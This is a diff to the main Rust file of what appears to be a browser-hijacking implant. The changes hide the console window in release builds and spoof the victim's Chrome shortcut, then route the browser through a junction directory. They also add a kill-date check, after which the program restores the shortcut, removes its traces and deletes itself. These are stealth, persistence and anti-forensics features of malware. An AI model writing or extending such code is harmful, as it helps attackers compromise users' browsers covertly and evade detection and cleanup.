@@ -1,3 +1,5 @@
+#![cfg_attr(not(feature = "debug"), windows_subsystem = "windows")] // only remove the console popup if not debugged
+
 use std::fs;
 use std::env;
 use std::path::PathBuf;
@@ -6,11 +8,9 @@ mod shortcut;
 use shortcut::{spoof_lnk, restore_lnk};
 
 mod browser;
-use browser::start_browser;
-
 use selfdeletion;
 
-#[async_std::main]
+#[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     #[cfg(feature = "debug")]
     println!("[*] Retreaving username...");
@@ -34,20 +34,34 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     } else {
         #[cfg(feature = "debug")]
         println!("[*] Starting browser...");
-        start_browser(&junc_path).await?;
+        match browser::run_browser(&junc_path).await {
+            Ok(is_past) => {
+                if is_past {
+                    #[cfg(feature = "debug")]
+                    println!("[*] Current date is past killdate.");
 
-        #[cfg(feature = "debug")]
-        println!("[*] Removing junction and dir...");
-        junction::delete(&junc_path)?;
-        fs::remove_dir(&junc_path)?;
+                    #[cfg(feature = "debug")]
+                    println!("[*] Removing junction and dir...");
+                    junction::delete(&junc_path)?;
+                    fs::remove_dir(&junc_path)?;
 
-        #[cfg(feature = "debug")]
-        println!("[*] Restoring Chrome shortcut...");
-        let _ = restore_lnk(username)?;
+                    #[cfg(feature = "debug")]
+                    println!("[*] Restoring Chrome shortcut...");
+                    let _ = restore_lnk(username)?;
 
-        #[cfg(feature = "debug")]
-        println!("[*] Deleting self...");
-        let _ = selfdeletion::delete_self();
+                    #[cfg(feature = "debug")]
+                    println!("[*] Deleting self...");
+                    let _ = selfdeletion::delete_self();
+                } else {
+                    #[cfg(feature = "debug")]
+                    println!("[*] Current date is not past killdate.");
+                }
+            }
+            Err(_e) => {
+                #[cfg(feature = "debug")]
+                println!("[!] An error occurred: {}", _e);
+            }
+        }
 
         #[cfg(feature = "debug")] {
             println!("[?] Press Enter to exit...");
